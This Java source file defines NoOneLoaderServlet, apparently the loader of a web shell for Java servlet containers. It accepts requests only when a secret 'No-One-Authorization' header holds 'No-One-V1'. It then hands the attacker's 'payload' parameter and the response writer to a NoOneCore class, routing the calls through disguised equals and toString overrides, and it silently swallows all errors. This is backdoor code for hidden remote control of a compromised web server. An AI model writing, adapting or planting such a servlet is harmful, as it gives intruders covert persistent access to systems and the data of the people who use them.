import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import javax.servlet.*;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneLoaderServlet extends ClassLoader implements Servlet {
    private static Class<?> coreClass = null;

    public NoOneLoaderServlet() {
    }

    public NoOneLoaderServlet(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (isAuthed(request)) {
                if (coreClass == null) {
                    coreClass = NoOneCore.class;
                }
                PrintWriter writer = response.getWriter();
                NoOneCore httpChannelCore = (NoOneCore) coreClass.newInstance();
                String payload = getArg(request);
                httpChannelCore.equals(new Object[]{payload, writer});
                httpChannelCore.toString();
            }
        } catch (Throwable ignored) {
        }
    }

    private boolean isAuthed(HttpServletRequest request) {
        String header = request.getHeader("No-One-Authorization");
        return header != null && header.contains("No-One-V1");
    }

    /**
     * 从模板中解析出加密数据段
     */
    private String getArg(HttpServletRequest request) {
        return request.getParameter("payload");
    }

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
